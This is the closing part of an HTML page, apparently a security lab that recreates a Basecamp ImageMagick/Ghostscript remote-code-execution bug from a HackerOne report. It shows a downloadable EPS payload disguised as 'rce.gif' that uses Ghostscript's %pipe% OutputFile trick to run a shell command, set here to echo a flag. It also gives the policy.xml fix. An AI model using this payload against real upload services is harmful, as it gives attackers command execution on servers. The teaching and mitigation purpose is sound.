            Sample EPS Payload (rce.gif)
          </div>
          <div class="eps-code"><span class="eps-hi-magic">%!PS</span>
<span class="eps-comment">% PostScript/EPS — will be detected by</span>
<span class="eps-comment">% ImageMagick and passed to Ghostscript</span>
userdict /setpagedevice undef
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark <span class="eps-hi-dir">/OutputFile</span> (<span class="eps-hi-pipe">%pipe%</span><span class="eps-hi-cmd">echo $FLAG</span>) currentdevice putdeviceprops</div>
          <div style="margin-top:10px;">
            <a href="1103.php?download=payload" class="bc-btn bc-btn-primary bc-btn-sm" style="width:100%;justify-content:center;">
              <svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
              Download rce.gif
            </a>
          </div>
        </div>

        <div class="atk-card">
          <div class="atk-card-title">
            <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
            Mitigation (What Basecamp Fixed)
          </div>
          <div style="font-size:.74rem;color:#8CC8D0;margin-bottom:8px;">Disabled the Ghostscript-based PS/PDF coders in ImageMagick security policy:</div>
          <div class="fix-code"><span class="fix-comment">&lt;!-- /etc/ImageMagick-6/policy.xml --&gt;</span>
&lt;policy domain="coder"
  rights="<span style="color:#F87171;">none</span>"
  pattern="<span style="color:#F5A700;">PS</span>" /&gt;
&lt;policy domain="coder"
  rights="<span style="color:#F87171;">none</span>"
  pattern="<span style="color:#F5A700;">EPS</span>" /&gt;
&lt;policy domain="coder"
  rights="<span style="color:#F87171;">none</span>"
  pattern="<span style="color:#F5A700;">PDF</span>" /&gt;</div>
          <div style="font-size:.7rem;color:#5D7898;margin-top:8px;">Also: validate magic bytes server-side, not just file extension.</div>
        </div>

        <div class="atk-card">
          <div class="atk-card-title">
            <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
            HackerOne Report
          </div>
          <div class="report-meta">
            <div><div class="rm-lbl">Report</div><div class="rm-val"><a href="https://hackerone.com/reports/365271" target="_blank" rel="noopener">#365271</a></div></div>
            <div><div class="rm-lbl">Reporter</div><div class="rm-val">gammarex</div></div>
            <div><div class="rm-lbl">Severity</div><div class="rm-val"><span class="sev-c">Critical (9–10)</span></div></div>
            <div><div class="rm-lbl">Bounty</div><div class="rm-val">$5,000</div></div>
            <div><div class="rm-lbl">CVE</div><div class="rm-val"><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-8291" target="_blank" rel="noopener">CVE-2017-8291</a></div></div>
            <div><div class="rm-lbl">Reported</div><div class="rm-val">Jun 13, 2018</div></div>
            <div><div class="rm-lbl">Disclosed</div><div class="rm-val">Nov 26, 2020</div></div>
            <div><div class="rm-lbl">Program</div><div class="rm-val">Basecamp</div></div>
          </div>
        </div>

      </div><!-- /right col -->

    </div><!-- /two-col -->
  </main>
</div>

<footer>
  <span>Basecamp 3 · My profile · Authenticated as Jason Fried · Lab simulation based on <a href="https://hackerone.com/reports/365271" target="_blank" rel="noopener">HackerOne #365271</a></span>
  <span>© 2018 Basecamp, LLC</span>
</footer>
</body>
</html>
